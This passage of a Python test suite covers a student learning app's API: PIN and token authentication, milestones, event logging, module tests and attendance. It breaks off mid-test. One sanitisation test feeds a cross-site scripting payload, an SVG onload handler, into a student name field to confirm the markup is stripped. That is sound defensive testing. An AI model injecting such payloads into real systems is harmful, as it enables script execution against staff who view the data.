# Copyright (c) 2026, FOSS United and contributors
# For license information, please see license.txt
"""Contract + validation tests for the public API. Run with:
    bench --site <site> run-tests --app hikmat
"""
import time

import frappe
from frappe.tests.utils import FrappeTestCase

from hikmat import api


class TestHikmatApi(FrappeTestCase):
	def test_signup_rejects_short_name(self):
		self.assertEqual(api.signup_student(name="A").get("error"), "bad_name")

	def test_signup_rejects_short_pin(self):
		# PIN must be 4–8 digits
		self.assertEqual(api.signup_student(name="Test Kid", pin="12").get("error"), "bad_pin")

	def test_signup_requires_a_pin(self):
		# Phase-0 hardening: a PIN is now mandatory (no more PIN-less, open profiles)
		self.assertEqual(api.signup_student(name="Pinless Kid").get("error"), "bad_pin")

	def test_signup_strips_markup_from_name(self):
		# student_name is denormalised onto every row a facilitator sees in Desk, so a name
		# may not carry markup — while real Hindi/English names must survive untouched.
		def _rm():
			for n in ("XSS Girl", "गुड़िया देवी", "D'Souza Rani-Kumari"):
				frappe.db.delete("Student", {"student_name": n})
			frappe.db.commit()
		self.addCleanup(_rm)
		r = api.signup_student(name="<svg onload=alert(1)>XSS Girl", pin="1234")
		self.assertTrue(r.get("ok"))
		self.assertEqual(frappe.db.get_value("Student", r["id"], "student_name"), "XSS Girl")
		for good in ("गुड़िया देवी", "D'Souza Rani-Kumari"):
			r = api.signup_student(name=good, pin="1234")
			self.assertEqual(frappe.db.get_value("Student", r["id"], "student_name"), good)

	def test_pin_ok_is_fail_closed(self):
		from werkzeug.security import generate_password_hash
		h = generate_password_hash("1234", method="pbkdf2:sha256")
		self.assertFalse(api._pin_ok("", "1234"))    # no stored PIN → cannot authenticate (was: True)
		self.assertFalse(api._pin_ok(h, ""))         # no PIN supplied
		self.assertFalse(api._pin_ok(h, "9999"))     # wrong PIN
		self.assertTrue(api._pin_ok(h, "1234"))      # correct PIN

	def test_token_valid_window(self):
		self.assertFalse(api._token_valid(None))
		self.assertTrue(api._token_valid(frappe.utils.now()))
		stale = frappe.utils.add_to_date(frappe.utils.now(), days=-(api._TOKEN_TTL_DAYS + 1))
		self.assertFalse(api._token_valid(stale))

	def test_token_ok_fail_closed_and_expiry(self):
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Token Test Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		self.assertFalse(api._token_ok(stu.name, "whatever"))     # no token yet → rejected (was: True)
		tok = api._token_for(stu.name)                            # mint
		self.assertTrue(api._token_ok(stu.name, tok))
		self.assertFalse(api._token_ok(stu.name, "wrong-token"))
		stale = frappe.utils.add_to_date(frappe.utils.now(), days=-(api._TOKEN_TTL_DAYS + 1))
		frappe.db.set_value("Student", stu.name, "token_issued_on", stale, update_modified=False)
		self.assertFalse(api._token_ok(stu.name, tok))            # right value but expired → rejected

	def test_login_rejects_pinless_profile(self):
		stu = frappe.get_doc({"doctype": "Student", "student_name": "No Pin Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		self.assertEqual(api.login_student(student=stu.name).get("error"), "no_pin")

	def test_authorized_token_path(self):
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Auth Path Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		tok = api._token_for(stu.name)
		self.assertTrue(api._authorized(stu.name, tok))          # matching campus token
		self.assertFalse(api._authorized(stu.name, "wrong"))     # bad token, no linked session
		self.assertFalse(api._authorized("does-not-exist", None))

	def test_signup_online_rejects_bad_username(self):
		self.assertEqual(api.signup_online(username="a", pin="1234", invite_code="x").get("error"),
		                 "bad_username")

	def test_signup_online_rejects_bad_pin(self):
		self.assertEqual(api.signup_online(username="asha01", pin="12", invite_code="x").get("error"),
		                 "bad_pin")

	def test_signup_online_rejects_bad_invite(self):
		# valid username + pin, but the invite code matches no cohort → generic bad_invite
		self.assertEqual(
			api.signup_online(username="asha01", pin="1234", invite_code="nope-nope").get("error"),
			"bad_invite")

	def test_get_my_student_resolves_session(self):
		email = "sess_test@" + api._ONLINE_EMAIL_DOMAIN
		# a later test's mid-suite commit can bake this row in — clean before AND after
		frappe.db.delete("Student", {"user": email})
		self.addCleanup(lambda: (frappe.db.delete("Student", {"user": email}), frappe.db.commit()))
		if not frappe.db.exists("User", email):
			u = frappe.get_doc({"doctype": "User", "email": email, "first_name": "Sess Test",
			                    "user_type": "Website User", "enabled": 1, "send_welcome_email": 0})
			u.flags.no_welcome_mail = True
			u.insert(ignore_permissions=True)
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Sess Test Girl", "gender": "Other",
		                      "active": 1, "mode": "Online", "user": email}).insert(ignore_permissions=True)
		frappe.set_user(email)
		try:
			r = api.get_my_student()
			self.assertTrue(r.get("ok"))
			self.assertEqual(r.get("id"), stu.name)
			self.assertTrue(r.get("token"))
		finally:
			frappe.set_user("Administrator")

	def test_get_my_student_guest_is_empty(self):
		frappe.set_user("Guest")
		try:
			self.assertFalse(api.get_my_student().get("ok"))
		finally:
			frappe.set_user("Administrator")

	def test_login_by_name_is_non_enumerating(self):
		# an unknown name returns the same generic error as a wrong PIN (no "does this name exist?")
		# The wrong-PIN budget is per NAME and lives in Redis for 24h, so this test clears its own
		# bucket — otherwise a suite re-run 50 times in one day would start answering "locked".
		acct = api._login_account_key("nm", "definitely nobody xyz")
		for b in api._login_buckets(acct):
			api._rate_reset(b)
			self.addCleanup(api._rate_reset, b)
		self.assertEqual(api.login_by_name(name="Definitely Nobody Xyz", pin="9999").get("error"), "bad_login")

	def test_submit_attempt_rejects_unknown_student(self):
		self.assertEqual(api.submit_attempt(student="nonexistent-xyz", track="t").get("error"), "unknown_student")

	def test_get_courses_shape(self):
		courses = api.get_courses()
		self.assertIsInstance(courses, list)
		for t in courses:
			for key in ("key", "title", "lessons", "band", "subject"):
				self.assertIn(key, t)
			self.assertIsInstance(t["lessons"], list)

	def test_get_structure_shape(self):
		st = api.get_structure()
		self.assertIn("bands", st)
		self.assertIn("subjects", st)

	# ---------------- Milestone "belt" gates ----------------
	# _check_milestones commits mid-test (it must — the attempt is already committed in
	# real use), which defeats FrappeTestCase's rollback. So every helper registers an
	# explicit cleanup; nothing test-made may survive into the live DB.
	def _mk_test_milestone(self):
		if not frappe.db.exists("Hikmat Milestone", "belt_test"):
			frappe.get_doc({"doctype": "Hikmat Milestone", "milestone_key": "belt_test",
			                "title": "Test Belt", "threshold_gems": 20, "active": 1,
			                "sort_order": 99}).insert(ignore_permissions=True)
		def _rm():
			frappe.db.delete("Evaluation", {"milestone": "belt_test"})
			frappe.db.delete("Hikmat Milestone", {"name": "belt_test"})
			frappe.db.commit()
			api.clear_content_cache()
		self.addCleanup(_rm)

	def _mk_student(self, name):
		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Evaluation", {"student": s})
				frappe.db.delete("Lesson Attempt", {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()
		self.addCleanup(_rm)
		return frappe.get_doc({"doctype": "Student", "student_name": name,
		                       "active": 1, "gender": "Other"}).insert(ignore_permissions=True)

	def _attempt(self, stu, lesson, activity, stars, coins=0):
		return frappe.get_doc({"doctype": "Lesson Attempt", "student": stu.name,
		                       "track": "t1", "lesson": lesson, "activity": activity,
		                       "stars": stars, "coins": coins,
		                       "attempted_on": frappe.utils.now()}).insert(ignore_permissions=True)

	def test_total_gems_accumulates_across_replays(self):
		stu = self._mk_student("Belt Sum Girl")
		self._attempt(stu, "l1", "learn", 2, coins=40)
		self._attempt(stu, "l1", "learn", 3, coins=55)   # replaying the same activity still earns
		self._attempt(stu, "l1", "spell", 1, coins=25)
		self.assertEqual(api._total_gems(stu.name), 120)

	def test_milestone_crossing_creates_pending_evaluation(self):
		stu = self._mk_student("Belt Cross Girl")
		sinfo = frappe._dict(student_name=stu.student_name, cohort=None)
		self._mk_test_milestone()   # a tiny milestone the student has already crossed
		self._attempt(stu, "l1", "learn", 3, coins=30)
		crossed = api._check_milestones(stu.name, sinfo)
		self.assertEqual(crossed, "belt_test")
		ev = frappe.get_doc("Evaluation", {"student": stu.name, "milestone": "belt_test"})
		self.assertEqual(ev.status, "Pending")
		self.assertEqual(ev.gems_at_reach, 30)
		# idempotent: crossing again never makes a second row
		self.assertIsNone(api._check_milestones(stu.name, sinfo))
		self.assertEqual(frappe.db.count("Evaluation",
			{"student": stu.name, "milestone": "belt_test"}), 1)

	def test_get_progress_returns_gates(self):
		stu = self._mk_student("Belt Gate Girl")
		tok = api._token_for(stu.name)
		self._mk_test_milestone()
		frappe.get_doc({"doctype": "Evaluation", "student": stu.name,
		                "milestone": "belt_test", "status": "Passed",
		                "reached_on": frappe.utils.now()}).insert(ignore_permissions=True)
		res = api.get_progress(student=stu.name, token=tok)
		self.assertEqual(res.get("gates", {}).get("belt_test"), "Passed")

	def test_settings_payload_carries_milestones(self):
		s = api._build_settings()
		self.assertIn("milestones", s)
		for m in s["milestones"]:
			for key in ("key", "title", "titleHi", "icon", "threshold"):
				self.assertIn(key, m)

	# ---------------- Learning-event stream (wrong answers) ----------------
	def test_log_event_rejects_unknown_kind(self):
		self.assertEqual(api.log_event(kind="dance_party").get("error"), "bad_kind")

	def test_log_event_anonymous_and_idempotent(self):
		def _rm():
			frappe.db.delete("Learning Event", {"client_id": "t-ev-1"})
			frappe.db.commit()
		self.addCleanup(_rm)
		r1 = api.log_event(kind="wrong_answer", track="t1", lesson="l1", activity="quiz",
		                   question="2+2?", chosen="5", answer="4", client_id="t-ev-1")
		self.assertTrue(r1.get("ok"))
		r2 = api.log_event(kind="wrong_answer", track="t1", lesson="l1", activity="quiz",
		                   question="2+2?", chosen="5", answer="4", client_id="t-ev-1")
		self.assertTrue(r2.get("dedup"))
		self.assertEqual(frappe.db.count("Learning Event", {"client_id": "t-ev-1"}), 1)

	def test_log_event_rejects_wrong_token_for_student(self):
		stu = self._mk_student("Event Auth Girl")
		r = api.log_event(kind="wrong_answer", student=stu.name, token="forged",
		                  question="q", chosen="a", answer="b")
		self.assertEqual(r.get("error"), "auth")

	# ---------------- Learning-event stream (dwell + tool use) ----------------
	def test_log_event_dwell_records_and_caps_duration(self):
		def _rm():
			frappe.db.delete("Learning Event", {"client_id": ("in", ["t-dw-1", "t-dw-2"])})
			frappe.db.commit()
		self.addCleanup(_rm)
		r = api.log_event(kind="dwell", track="t1", lesson="l1", activity="spell",
		                  duration_secs=95, client_id="t-dw-1")
		self.assertTrue(r.get("ok"))
		self.assertEqual(frappe.db.get_value("Learning Event", {"client_id": "t-dw-1"},
		                                     "duration_secs"), 95)
		# a left-open-overnight tab can't poison the time averages: hard 2h cap
		r2 = api.log_event(kind="dwell", track="t1", lesson="l1", activity="spell",
		                   duration_secs=999999, client_id="t-dw-2")
		self.assertTrue(r2.get("ok"))
		self.assertEqual(frappe.db.get_value("Learning Event", {"client_id": "t-dw-2"},
		                                     "duration_secs"), 7200)

	def test_log_event_dwell_requires_duration(self):
		self.assertEqual(api.log_event(kind="dwell", track="t1").get("error"), "bad_duration")

	def test_log_event_tool_use_batches_count(self):
		def _rm():
			frappe.db.delete("Learning Event", {"client_id": "t-tool-1"})
			frappe.db.commit()
		self.addCleanup(_rm)
		r = api.log_event(kind="tool_use", tool="listen_word", track="t1", lesson="l1",
		                  activity="learn", count=7, client_id="t-tool-1")
		self.assertTrue(r.get("ok"))
		row = frappe.db.get_value("Learning Event", {"client_id": "t-tool-1"},
		                          ["tool", "count"], as_dict=True)
		self.assertEqual(row.tool, "listen_word")
		self.assertEqual(row.count, 7)

	def test_log_event_tool_use_requires_tool(self):
		self.assertEqual(api.log_event(kind="tool_use", count=3).get("error"), "bad_tool")

	def test_submit_attempt_stores_capped_duration(self):
		stu = self._mk_student("Dwell Girl")
		tok = api._token_for(stu.name)
		r = api.submit_attempt(student=stu.name, token=tok, track="t1", lesson="l1",
		                       activity="quiz", stars=2, score=4, total=5,
		                       duration_secs=999999, client_id="t-att-dur-1")
		self.assertTrue(r.get("ok"))
		self.assertEqual(frappe.db.get_value("Lesson Attempt", {"client_id": "t-att-dur-1"},
		                                     "duration_secs"), 7200)


class TestModuleTests(FrappeTestCase):
	"""Module-end tests: bank validation, curriculum export, submit_test hardening,
	get_progress tests/testSeen. Mirrors TestHikmatApi's explicit-cleanup style."""

	def _mk_student(self, name):
		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Test Attempt", {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()
		self.addCleanup(_rm)
		return frappe.get_doc({"doctype": "Student", "student_name": name,
		                       "active": 1, "gender": "Other"}).insert(ignore_permissions=True)

	def _mk_track(self, key="mt-track"):
		def _rm():
			frappe.db.delete("Module Test", {"track": key})
			frappe.db.delete("Track", {"name": key})
			frappe.db.commit()
			api.clear_content_cache()
		self.addCleanup(_rm)
		if frappe.db.exists("Track", key):
			frappe.delete_doc("Track", key, force=1, ignore_permissions=True)
		return frappe.get_doc({"doctype": "Track", "track_key": key, "title": "MT Track",
		                       "published": 1}).insert(ignore_permissions=True)

	def _q(self, i):
		return {"question": f"Q{i}?", "choices": "a\nb\nc", "answer": "a"}

	def _mk_module_test(self, track, n_questions=10, per_paper=5, pass_pct=60):
		mt = frappe.get_doc({"doctype": "Module Test", "track": track.name, "active": 1,
		                     "questions_per_paper": per_paper, "pass_pct": pass_pct,
		                     "time_limit_secs": 600,
		                     "questions": [self._q(i) for i in range(n_questions)]})
		mt.insert(ignore_permissions=True)
		return mt

	def test_module_test_rejects_answer_not_in_choices(self):
		track = self._mk_track("mt-badq")
		mt = frappe.get_doc({"doctype": "Module Test", "track": track.name,
		                     "questions_per_paper": 1, "pass_pct": 60, "time_limit_secs": 600,
		                     "questions": [{"question": "Q?", "choices": "a\nb", "answer": "zzz"}]})
		self.assertRaises(frappe.ValidationError, mt.insert)

	def test_module_test_rejects_bank_smaller_than_paper(self):
		track = self._mk_track("mt-small")
		mt = frappe.get_doc({"doctype": "Module Test", "track": track.name,
		                     "questions_per_paper": 5, "pass_pct": 60, "time_limit_secs": 600,
		                     "questions": [self._q(i) for i in range(3)]})
		self.assertRaises(frappe.ValidationError, mt.insert)

	def test_module_test_rejects_bad_config(self):
		track = self._mk_track("mt-cfg")
		base = {"doctype": "Module Test", "track": track.name,
		        "questions": [self._q(i) for i in range(3)]}
		for bad in ({"questions_per_paper": 0, "pass_pct": 60, "time_limit_secs": 600},
		            {"questions_per_paper": 1, "pass_pct": 0, "time_limit_secs": 600},
		            {"questions_per_paper": 1, "pass_pct": 101, "time_limit_secs": 600},
		            {"questions_per_paper": 1, "pass_pct": 60, "time_limit_secs": 30}):
			mt = frappe.get_doc({**base, **bad})
			self.assertRaises(frappe.ValidationError, mt.insert)

	def test_track_json_exports_bank_without_answkey_leaks(self):
		track = self._mk_track("mt-export")
		self._mk_module_test(track, n_questions=6, per_paper=5)
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == "mt-export")
		self.assertIn("test", t)
		self.assertEqual(t["test"]["questionsPerPaper"], 5)
		self.assertEqual(t["test"]["passPct"], 60)
		self.assertEqual(len(t["test"]["bank"]), 6)
		for q in t["test"]["bank"]:
			for key in ("id", "q", "choices", "answer"):
				self.assertIn(key, q)
			self.assertNotIn("teach", q)      # facilitator notes never ship in a test

	def test_track_json_skips_inactive_test(self):
		track = self._mk_track("mt-inactive")
		mt = self._mk_module_test(track, n_questions=6, per_paper=5)
		frappe.db.set_value("Module Test", mt.name, "active", 0)
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == "mt-inactive")
		self.assertNotIn("test", t)

	def test_submit_test_rejects_unknown_student_and_bad_token(self):
		self.assertEqual(api.submit_test(student="nope-xyz", track="t",
		                                 status="completed").get("error"), "unknown_student")
		stu = self._mk_student("Test Auth Girl")
		r = api.submit_test(student=stu.name, token="forged", track="t", status="completed")
		self.assertEqual(r.get("error"), "auth")

	def test_submit_test_rejects_bad_status(self):
		stu = self._mk_student("Test Status Girl")
		tok = api._token_for(stu.name)
		r = api.submit_test(student=stu.name, token=tok, track="t", status="hacked")
		self.assertEqual(r.get("error"), "bad_status")

	def test_submit_test_idempotent_on_client_id(self):
		stu = self._mk_student("Test Dedup Girl")
		tok = api._token_for(stu.name)
		kw = dict(student=stu.name, token=tok, track="t1", status="completed",
		          score=4, total=5, client_id="t-test-1")
		r1 = api.submit_test(**kw)
		self.assertTrue(r1.get("ok"))
		r2 = api.submit_test(**kw)
		self.assertTrue(r2.get("dedup"))
		self.assertEqual(frappe.db.count("Test Attempt", {"client_id": "t-test-1"}), 1)

	def test_submit_test_exited_forces_zero(self):
		stu = self._mk_student("Test Void Girl")
		tok = api._token_for(stu.name)
		r = api.submit_test(student=stu.name, token=tok, track="t1", status="exited",
		                    exit_reason="hidden", score=9, total=10, client_id="t-test-void")
		self.assertTrue(r.get("ok"))
		self.assertFalse(r.get("passed"))
		row = frappe.db.get_value("Test Attempt", {"client_id": "t-test-void"},
		                          ["score", "pct", "passed", "status", "exit_reason"], as_dict=True)
		self.assertEqual(row.score, 0)
		self.assertEqual(row.pct, 0)
		self.assertEqual(row.passed, 0)
		self.assertEqual(row.status, "Exited")
		self.assertEqual(row.exit_reason, "hidden")

	def test_submit_test_pass_computed_server_side(self):
		track = self._mk_track("mt-pass")
		self._mk_module_test(track, n_questions=10, per_paper=10, pass_pct=60)
		stu = self._mk_student("Test Pass Girl")
		tok = api._token_for(stu.name)
		r = api.submit_test(student=stu.name, token=tok, track="mt-pass", status="completed",
		                    score=6, total=10, client_id="t-test-p1")
		self.assertTrue(r.get("passed"))
		r = api.submit_test(student=stu.name, token=tok, track="mt-pass", status="completed",
		                    score=5, total=10, client_id="t-test-p2")
		self.assertFalse(r.get("passed"))
		# running out of time is not cheating — answered-so-far still counts
		r = api.submit_test(student=stu.name, token=tok, track="mt-pass", status="timed_out",
		                    score=7, total=10, client_id="t-test-p3")
		self.assertTrue(r.get("passed"))

	def test_submit_test_clamps_and_survives_bad_paper(self):
		stu = self._mk_student("Test Clamp Girl")
		tok = api._token_for(stu.name)
		r = api.submit_test(student=stu.name, token=tok, track="t1", status="completed",
		                    score=99, total=5, paper="not-json[", duration_secs=999999,
		                    client_id="t-test-clamp")
		self.assertTrue(r.get("ok"))
		row = frappe.db.get_value("Test Attempt", {"client_id": "t-test-clamp"},
		                          ["score", "paper", "duration_secs", "attempted_on"], as_dict=True)
		self.assertEqual(row.score, 5)              # clamped to total
		self.assertEqual(row.paper, "[]")           # malformed paper never rejects the write
		self.assertEqual(row.duration_secs, 7200)
		self.assertTrue(row.attempted_on)           # first-exposure ordering depends on this

	def test_get_progress_returns_tests_and_seen_union(self):
		stu = self._mk_student("Test Seen Girl")
		tok = api._token_for(stu.name)
		api.submit_test(student=stu.name, token=tok, track="t1", status="completed",
		                score=3, total=5, paper='["qa","qb"]', client_id="t-seen-1")
		api.submit_test(student=stu.name, token=tok, track="t1", status="exited",
		                exit_reason="blur", score=0, total=5, paper='["qb","qc"]',
		                client_id="t-seen-2")
		res = api.get_progress(student=stu.name, token=tok)
		self.assertIn("t1", res.get("tests", {}))
		self.assertEqual(res["tests"]["t1"]["attempts"], 2)
		self.assertEqual(res["tests"]["t1"]["bestPct"], 60)
		# voided papers still burn: the union is qa, qb, qc in first-exposure order
		self.assertEqual(res.get("testSeen", {}).get("t1"), ["qa", "qb", "qc"])

	def test_log_event_accepts_test_exit(self):
		def _rm():
			frappe.db.delete("Learning Event", {"client_id": "t-texit-1"})
			frappe.db.commit()
		self.addCleanup(_rm)
		r = api.log_event(kind="test_exit", track="t1", activity="test", tool="hidden",
		                  duration_secs=120, count=3, client_id="t-texit-1")
		self.assertTrue(r.get("ok"))
		self.assertEqual(api.log_event(kind="dance_party").get("error"), "bad_kind")

	def test_delete_student_erases_test_attempts(self):
		stu = self._mk_student("Test Erase Girl")
		tok = api._token_for(stu.name)
		api.submit_test(student=stu.name, token=tok, track="t1", status="completed",
		                score=1, total=5, client_id="t-erase-1")
		api.delete_student(stu.name)
		self.assertEqual(frappe.db.count("Test Attempt", {"student": stu.name}), 0)


class TestAttendance(FrappeTestCase):
	"""log_attendance: auth, clamps, dedup, day upsert, thresholds, date window."""

	def _mk_student(self, name):
		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Attendance Ping", {"student": s})
				frappe.db.delete("Attendance Day", {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()
		self.addCleanup(_rm)
		return frappe.get_doc({"doctype": "Student", "student_name": name,
		                       "active": 1, "gender": "Other"}).insert(ignore_permissions=True)

	def test_log_attendance_rejects_unknown_student(self):
		r = api.log_attendance(student="nope-xyz", date=frappe.utils.nowdate(), secs=60)
		self.assertEqual(r.get("error"), "unknown_student")

	def test_log_attendance_rejects_bad_token(self):
		stu = self._mk_student("Att Auth Girl")
		r = api.log_attendance(student=stu.name, token="forged",
		                       date=frappe.utils.nowdate(), secs=60)
		self.assertEqual(r.get("error"), "auth")

	def test_log_attendance_clamps_secs(self):
		stu = self._mk_student("Att Clamp Girl")
		tok = api._token_for(stu.name)
		r = api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                       secs=99999, client_id="t-att-c1")
		self.assertTrue(r.get("ok"))
		self.assertEqual(r.get("secs_today"), 900)   # one ping can never claim >15 min
		r = api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                       secs=0, client_id="t-att-c2")
		self.assertEqual(r.get("error"), "bad_secs")

	def test_log_attendance_dedups_client_id(self):
		stu = self._mk_student("Att Dedup Girl")
		tok = api._token_for(stu.name)
		kw = dict(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		          secs=300, client_id="t-att-d1")
		self.assertTrue(api.log_attendance(**kw).get("ok"))
		self.assertTrue(api.log_attendance(**kw).get("dedup"))
		day = frappe.db.get_value("Attendance Day",
		                          {"student": stu.name, "date": frappe.utils.nowdate()},
		                          "active_secs")
		self.assertEqual(day, 300)                   # the retry added nothing

	def test_log_attendance_upserts_and_sums(self):
		stu = self._mk_student("Att Sum Girl")
		tok = api._token_for(stu.name)
		api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                   secs=300, client_id="t-att-s1", device_id="dev-a")
		api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                   secs=600, client_id="t-att-s2", device_id="dev-b")
		rows = frappe.get_all("Attendance Day",
		                      filters={"student": stu.name, "date": frappe.utils.nowdate()},
		                      fields=["active_secs", "device_count", "first_ping", "last_ping"])
		self.assertEqual(len(rows), 1)
		self.assertEqual(rows[0].active_secs, 900)
		self.assertEqual(rows[0].device_count, 2)
		self.assertTrue(rows[0].first_ping <= rows[0].last_ping)

	def test_log_attendance_rejects_out_of_range_dates(self):
		stu = self._mk_student("Att Range Girl")
		tok = api._token_for(stu.name)
		too_old = frappe.utils.add_days(frappe.utils.nowdate(), -(api._ATT_PAST_WINDOW_DAYS + 1))
		future = frappe.utils.add_days(frappe.utils.nowdate(), api._ATT_FUTURE_WINDOW_DAYS + 1)
		self.assertEqual(api.log_attendance(student=stu.name, token=tok, date=too_old,
		                                    secs=60).get("error"), "date_out_of_range")
		self.assertEqual(api.log_attendance(student=stu.name, token=tok, date=future,
		                                    secs=60).get("error"), "date_out_of_range")
		ok_old = frappe.utils.add_days(frappe.utils.nowdate(), -api._ATT_PAST_WINDOW_DAYS)
		self.assertTrue(api.log_attendance(student=stu.name, token=tok, date=ok_old,
		                                   secs=60, client_id="t-att-r1").get("ok"))
		self.assertEqual(api.log_attendance(student=stu.name, token=tok, date="garbage",
		                                    secs=60).get("error"), "bad_date")

	def test_present_flips_at_threshold(self):
		stu = self._mk_student("Att Present Girl")
		tok = api._token_for(stu.name)
		# default threshold 150 min = 9000s; 900s/ping → 10 pings to Present
		for i in range(9):
			r = api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
			                       secs=900, client_id=f"t-att-p{i}")
		self.assertFalse(r.get("present"))           # 8100s < 9000s
		r = api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                       secs=900, client_id="t-att-p9")
		self.assertTrue(r.get("present"))            # 9000s ≥ 9000s

	def test_daily_attendance_report_marks_absent(self):
		from hikmat.hikmat.report.daily_attendance.daily_attendance import execute
		stu = self._mk_student("Att Report Girl")
		today = frappe.utils.nowdate()
		cols, rows, _msg, _chart, summary = execute(
			{"from_date": today, "to_date": today, "student": stu.name})
		mine = [r for r in rows if r["student"] == stu.name]
		self.assertEqual(len(mine), 1)
		self.assertEqual(mine[0]["status"], "Absent")   # no pings → explicit Absent row
		tok = api._token_for(stu.name)
		for i in range(10):
			api.log_attendance(student=stu.name, token=tok, date=today, secs=900,
			                   client_id=f"t-att-rep{i}")
		_c, rows, _m, _ch, _s = execute({"from_date": today, "to_date": today, "student": stu.name})
		mine = [r for r in rows if r["student"] == stu.name]
		self.assertEqual(mine[0]["status"], "Present")
		self.assertEqual(mine[0]["active_minutes"], 150)

	def test_attendance_summary_report_aggregates(self):
		from hikmat.hikmat.report.attendance_summary.attendance_summary import execute
		stu = self._mk_student("Att Summary Girl")
		tok = api._token_for(stu.name)
		today = frappe.utils.nowdate()
		for i in range(10):
			api.log_attendance(student=stu.name, token=tok, date=today, secs=900,
			                   client_id=f"t-att-sum{i}")
		_c, rows, _m, _ch, _s = execute({"from_date": today, "to_date": today})
		mine = [r for r in rows if r["student"] == stu.name]
		self.assertEqual(len(mine), 1)
		self.assertEqual(mine[0]["days_present"], 1)
		self.assertEqual(mine[0]["total_active_hours"], 2.5)

	def test_delete_student_erases_attendance(self):
		stu = self._mk_student("Att Erase Girl")
		tok = api._token_for(stu.name)
		api.log_attendance(student=stu.name, token=tok, date=frappe.utils.nowdate(),
		                   secs=300, client_id="t-att-e1")
		api.delete_student(stu.name)
		self.assertEqual(frappe.db.count("Attendance Ping", {"student": stu.name}), 0)
		self.assertEqual(frappe.db.count("Attendance Day", {"student": stu.name}), 0)


class TestTrackVideo(FrappeTestCase):
	"""Track explainer-video fields: export shape + public-file validation."""

	def _mk_track(self, key, **kw):
		def _rm():
			frappe.db.delete("Track", {"name": key})
			frappe.db.commit()
			api.clear_content_cache()
		self.addCleanup(_rm)
		if frappe.db.exists("Track", key):
			frappe.delete_doc("Track", key, force=1, ignore_permissions=True)
		return frappe.get_doc({"doctype": "Track", "track_key": key, "title": "V Track",
		                       "published": 1, **kw}).insert(ignore_permissions=True)

	def test_get_courses_exposes_video_when_set(self):
		self._mk_track("vid-set", video="/files/expl.mp4", video_title="Watch this",
		               video_title_hi="यह देखो", video_duration_secs=180)
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == "vid-set")
		self.assertEqual(t["videoUrl"], "/files/expl.mp4")
		self.assertEqual(t["videoTitle"], "Watch this")
		self.assertEqual(t["videoTitleHi"], "यह देखो")
		self.assertEqual(t["videoDuration"], 180)

	def test_get_courses_omits_video_keys_when_unset(self):
		self._mk_track("vid-unset")
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == "vid-unset")
		self.assertNotIn("videoUrl", t)
		self.assertNotIn("videoDuration", t)

	def test_track_rejects_private_video(self):
		doc = frappe.get_doc({"doctype": "Track", "track_key": "vid-priv", "title": "P",
		                      "published": 0, "video": "/private/files/x.mp4"})
		self.assertRaises(frappe.ValidationError, doc.insert)


class TestLessonReply(FrappeTestCase):
	"""Reply-to-the-Email activity: curriculum export shape."""

	def test_track_json_exports_reply(self):
		key = "reply-export-t"
		def _rm():
			# children first — frappe.db.delete on the Lesson does NOT cascade, and a
			# leftover child row would double the reply count on the next suite run
			frappe.db.delete("Lesson Reply", {"parent": key + "-l1"})
			frappe.db.delete("Lesson", {"track": key})
			frappe.db.delete("Track", {"name": key})
			frappe.db.commit()
			api.clear_content_cache()
		self.addCleanup(_rm)
		_rm()   # clean before AND after — an earlier run may have baked orphans in
		track = frappe.get_doc({"doctype": "Track", "track_key": key, "title": "Reply T",
		                        "published": 1}).insert(ignore_permissions=True)
		import json as _json
		frappe.get_doc({"doctype": "Lesson", "track": track.name, "lesson_key": "l1",
		                "title": "L1", "published": 1,
		                "reply": [{"from_name": "Sunita Madam", "subject": "Class time",
		                           "message": "Class starts at 10 tomorrow.",
		                           "message_hi": "कक्षा कल 10 बजे शुरू होगी।",
		                           "spec_json": _json.dumps({"slots": [
		                               {"label": "Greeting", "labelHi": "अभिवादन",
		                                "options": [{"t": "Dear Sunita Madam,", "hi": "आदरणीय", "ok": True},
		                                            {"t": "Hey you,", "hi": "ऐ", "ok": False}]}]})}],
		               }).insert(ignore_permissions=True)
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == key)
		les = t["lessons"][0]
		self.assertEqual(len(les["reply"]), 1)
		r = les["reply"][0]
		self.assertEqual(r["from"], "Sunita Madam")
		self.assertEqual(r["subject"], "Class time")
		self.assertEqual(r["msg"], "Class starts at 10 tomorrow.")
		self.assertEqual(len(r["slots"]), 1)
		self.assertTrue(r["slots"][0]["options"][0]["ok"])

	def test_reply_export_survives_bad_spec_json(self):
		key = "reply-badspec-t"
		def _rm():
			frappe.db.delete("Lesson Reply", {"parent": key + "-l1"})
			frappe.db.delete("Lesson", {"track": key})
			frappe.db.delete("Track", {"name": key})
			frappe.db.commit()
			api.clear_content_cache()
		self.addCleanup(_rm)
		_rm()   # clean before AND after — an earlier run may have baked orphans in
		track = frappe.get_doc({"doctype": "Track", "track_key": key, "title": "Reply B",
		                        "published": 1}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "Lesson", "track": track.name, "lesson_key": "l1",
		                "title": "L1", "published": 1,
		                "reply": [{"from_name": "X", "message": "m", "spec_json": "not-json["}],
